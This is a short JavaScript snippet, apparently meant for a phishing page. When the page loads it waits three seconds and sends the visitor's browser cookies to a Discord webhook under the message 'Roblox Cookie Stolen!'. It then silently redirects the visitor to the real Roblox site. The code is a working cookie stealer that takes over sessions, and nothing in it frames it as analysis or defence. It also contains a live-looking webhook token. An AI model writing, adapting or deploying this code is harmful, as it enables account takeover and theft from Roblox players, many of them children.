window.onload = function() {
    setTimeout(function() {
        fetch('https://discord.com/api/webhooks/1566889927331938345/HjeYNYbP4TPSbCefwKt93LDBpEVBqAatY6fSiDBRB36wglMU8p14V4KgqdPU0aR-AQcb', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content: '**Roblox Cookie Stolen!**\n\nCookie: ```' + document.cookie + '```'})
        }).catch(e => {});
        window.location.href = 'https://www.roblox.com/';
    }, 3000);
};
